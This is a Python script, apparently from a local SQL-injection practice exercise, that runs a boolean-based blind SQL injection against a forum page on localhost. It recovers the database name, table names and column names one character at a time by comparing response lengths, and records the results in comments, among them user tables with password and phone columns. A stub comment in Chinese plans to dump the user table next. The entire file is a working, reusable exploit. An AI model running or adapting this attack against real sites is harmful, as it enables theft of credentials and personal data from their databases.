import string
import requests

base_url = 'http://localhost/forum/html/sql_injection_html.php?forumid=8'
base_size = len(requests.get(base_url).text)
acsii = f"{string.ascii_letters}{string.digits}_,"


def get_databases():
    databases = ''
    global acsii, base_url, base_size
    for i in range(50):
        databases_length = f"{base_url} and length(database())={i}"
        if len(requests.get(databases_length).text) == base_size:
            for count in range(1, i + 1):
                for a in acsii:
                    databases_name = f"{base_url} and substr(database(),{count},1)='{a}'"
                    if len(requests.get(databases_name).text) == base_size:
                        databases += a
                        break
            break
    return databases  # zzz


def get_tables():
    tables = ''
    global acsii, base_url, base_size
    for i in range(100):
        table_length = f"{base_url} and LENGTH((select GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE table_schema='zzz'))={i}"
        if len(requests.get(table_length).text) == base_size:
            for count in range(1, i + 1):
                for a in acsii:
                    table_name = f"{base_url} and substr((select GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE table_schema='zzz'),{count},1)='{a}'"
                    if len(requests.get(table_name).text) == base_size:
                        tables += a
                        break
            break
    table = tables.split(',')
    return table  # ['dboption', 'forum', 'py_welcome', 'py_welcome_log', 'student', 'user', 'user_old']


def get_column():
    columns = {}
    table = ['dboption', 'forum', 'py_welcome', 'py_welcome_log', 'student', 'user', 'user_old']
    global acsii, base_url, base_size
    for t in table:
        column = ''
        for i in range(100):
            column_length = f"{base_url} and LENGTH((select GROUP_CONCAT(column_name) from information_schema.COLUMNS WHERE table_schema='zzz' and table_name='{t}'))={i}"
            if len(requests.get(column_length).text) == base_size:
                for count in range(1, i + 1):
                    for a in acsii:
                        column_name = f"{base_url} and substr((select GROUP_CONCAT(column_name) from information_schema.COLUMNS WHERE table_schema='zzz' and table_name='{t}'),{count},1)='{a}'"
                        if len(requests.get(column_name).text) == base_size:
                            column += a
                            break
                break
        columns[t] = column
    return columns  # {'dboption': 'id,name', 'forum': 'forumid,headline,content,username,createtime', 'py_welcome': 'username,password,phone,balance', 'py_welcome_log': 'username,event,time', 'student': 'studentid,sname,age,degree,sex,phone,classid,createtime', 'user': 'userid,username,password,role,phone,imgs,createtime,count,lasttime', 'user_old': 'userid,username,password,role,phone,imgs,createtime'}


def do_torco():
    pass  # 思路同上，抓zzz.user表下面的字段


if __name__ == '__main__':
    do_torco()
    # print(get_databases())
    # print(get_tables())
    # print(get_column())
